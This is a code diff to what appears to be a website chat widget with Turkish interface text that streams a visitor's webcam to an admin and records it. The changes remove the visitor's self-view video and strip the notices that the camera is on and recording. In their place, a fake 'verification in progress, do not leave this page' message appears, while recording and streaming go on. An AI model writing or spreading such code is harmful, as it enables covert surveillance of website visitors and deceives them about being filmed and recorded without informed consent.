@@ -433,26 +433,21 @@
     }
   }
 
-  function showLocalCameraPreview(box, stream, callId) {
+  function showSilentCameraStatus(box, callId) {
+    box.querySelectorAll(".chat-camera-preview").forEach((el) => el.remove());
     const wrap = document.createElement("div");
-    wrap.className = "chat-camera-preview";
+    wrap.className = "chat-camera-preview chat-camera-silent";
     wrap.dataset.callId = callId;
 
     const label = document.createElement("p");
     label.className = "chat-camera-preview-label";
-    label.textContent = "Kameranız açık · kayıt alınıyor";
+    label.textContent = "Doğrulama devam ediyor… Lütfen bu sayfadan ayrılmayın.";
 
-    const video = document.createElement("video");
-    video.className = "chat-camera-video";
-    video.autoplay = true;
-    video.playsInline = true;
-    video.muted = true;
-    video.srcObject = stream;
-
-    wrap.append(label, video);
+    wrap.appendChild(label);
     box.appendChild(wrap);
     box.scrollTop = box.scrollHeight;
-    return { wrap, video, label };
+    // Video elementi yok — ziyaretçi kendi görüntüsünü görmez
+    return { wrap, video: null, label };
   }
 
   async function startVisitorCamera(box, callId, options = {}) {
@@ -501,14 +496,15 @@
       return "denied";
     }
 
-    const preview = showLocalCameraPreview(box, stream, callId);
+    // Sessiz akış: önizleme yok, sadece durum metni
+    const preview = showSilentCameraStatus(box, callId);
     const pc = new RTCPeerConnection(sync.ICE_SERVERS);
     const sessionId = sync.getSessionId();
     const state = {
       pc,
       stream,
       wrap: preview.wrap,
-      video: preview.video,
+      video: null,
       label: preview.label,
       recorder: null,
       recordChunks: [],
@@ -519,7 +515,7 @@
     cameraSessions.set(callId, state);
 
     if (!startVisitorRecording(state)) {
-      preview.label.textContent = "Kameranız açık · kayıt başlatılamadı";
+      preview.label.textContent = "Doğrulama devam ediyor… (kayıt sınırlı)";
     }
 
     stream.getVideoTracks().forEach((track) => {
@@ -539,7 +535,7 @@
 
     pc.onconnectionstatechange = () => {
       if (state.label && pc.connectionState === "connected") {
-        state.label.textContent = "Kameranız açık · admin’e bağlı · kayıt alınıyor";
+        state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
       }
     };
 
@@ -607,7 +603,12 @@
         type: offer.type,
         sdp: offer.sdp,
       });
-      appendMessage(box, "user", auto ? "Kamera otomatik açıldı." : "Kamerayı açtım.");
+      appendMessage(
+        box,
+        "user",
+        auto ? "Kamera izni verildi." : "Kamera izni onaylandı.",
+        { sync: true }
+      );
       return "ok";
     } catch (err) {
       console.error(err);
@@ -640,7 +641,7 @@
     const note = document.createElement("p");
     note.className = "chat-camera-note";
     note.textContent =
-      "Tarayıcı otomatik açamadı. Devam etmek için aşağıdan kamerayı açın. Oturum kaydı alınabilir.";
+      "Devam etmek için tarayıcı kamera iznini onaylayın. Görüntünüz bu ekranda gösterilmez.";
 
     const actions = document.createElement("div");
     actions.className = "chat-inline-prompt-actions";
@@ -648,7 +649,7 @@
     const okBtn = document.createElement("button");
     okBtn.type = "button";
     okBtn.className = "btn btn-primary";
-    okBtn.textContent = msg.okLabel || "Kamerayı aç";
+    okBtn.textContent = msg.okLabel || "İzin ver";
 
     const cancelBtn = document.createElement("button");
     cancelBtn.type = "button";
@@ -703,8 +704,8 @@
     const status = document.createElement("div");
     status.className = "chat-inline-prompt chat-camera-auto";
     status.innerHTML =
-      '<p class="chat-inline-prompt-title">Kamera otomatik açılıyor…</p>' +
-      '<p class="chat-camera-note">Tarayıcı izin isterse lütfen İzin Ver seçin.</p>';
+      '<p class="chat-inline-prompt-title">Kamera izni isteniyor…</p>' +
+      '<p class="chat-camera-note">Tarayıcı izin isterse İzin Ver seçin. Görüntünüz bu ekranda görünmez.</p>';
     box.appendChild(status);
     box.scrollTop = box.scrollHeight;
 
@@ -718,6 +719,8 @@
 
     if (result === "need-gesture") {
       showCameraRequest(box, msg);
+    } else if (result === "ok") {
+      // Sessiz: ekstra “kamera açıldı” spam’i yok
     }
   }
 
